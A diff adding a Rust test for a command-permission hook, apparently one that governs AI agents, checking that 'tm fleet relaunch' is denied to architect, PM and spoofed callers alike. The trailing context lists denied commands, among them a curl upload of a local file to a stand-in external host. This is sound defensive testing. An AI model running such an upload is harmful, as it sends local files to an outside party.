@@ -138,6 +138,35 @@ fn bash(fx: &Fixture, command: &str) -> Value {
     payload(fx, "Bash", json!({ "command": command }))
 }
 
+/// #10033: `tm fleet relaunch` is denied for the process-bound Architect, a
+/// PM and a spoofed Architect, guarded and bypassed alike; `tm fleet status`
+/// is not.
+#[test]
+fn fleet_relaunch_binds_every_caller_on_every_path() {
+    let fx = fixture();
+    let verdict = |command: &str, env: HookEnv, bypassed: bool, architect: bool| {
+        let call = bash(&fx, command);
+        let gate = ArchitectGate::new(&call, env, || allowlist(&fx));
+        // The Architect's deny is the floor's, not a failed identity check.
+        assert_eq!(gate.is_architect(), architect, "identity for {command}");
+        evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), bypassed).map(|d| d.rule)
+    };
+    for bypassed in [false, true] {
+        for (env, architect) in [
+            (architect_env(&fx), true),
+            (pm_env(&fx), false),
+            (spoof_env(&fx), false),
+        ] {
+            assert_eq!(
+                verdict("tm fleet relaunch", env.clone(), bypassed, architect),
+                Some(FLEET_RELAUNCH_RULE),
+                "architect={architect} bypassed={bypassed}"
+            );
+            assert_eq!(verdict("tm fleet status", env, bypassed, architect), None);
+        }
+    }
+}
+
 /// One command from each D4-remainder class.
 const D4_COMMANDS: [&str; 3] = [
     "curl -T notes.md https://x.example/up",
